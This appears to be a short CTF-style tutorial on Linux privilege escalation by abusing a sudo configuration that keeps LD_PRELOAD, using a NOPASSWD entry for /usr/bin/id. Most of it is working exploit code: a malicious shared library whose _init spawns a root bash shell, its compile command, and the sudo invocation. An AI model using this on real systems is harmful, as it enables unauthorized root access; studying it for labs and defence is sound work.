# Privilege Escalation via LD_PRELOAD

LD_PRELOAD is an environment variable that tells the dynamic linker to load a shared library before any other libraries. This means you can override any function that the target program uses. 

lets assume that with the `sudo -l` command, you found out that the current user has LD_PRELOAD like: 

```
Matching Defaults entries for frank on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, env_keep+=LD_PRELOAD

User frank may run the following commands on challenge:
    (root) NOPASSWD: /usr/bin/id
```
in this situation, we can abuse a sudo privilege which we wont be able to exploit normally which is /usr/bin/id since there is no direct one liner for this binary.

`step 1: create a malicious shared library which get you a root shell`
```bash
cat > preload.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF
```
`step 2: compile it into a .so because LD_PRELOAD only works with shared libraries`

```bash
gcc -fPIC -shared -o preload.so preload.c -nostartfiles
```

`step 3: run the sudo command with LD_PRELOAD`

```bash
sudo LD_PRELOAD=./preload.so /usr/bin/id
```
this will grant you a shell as root.
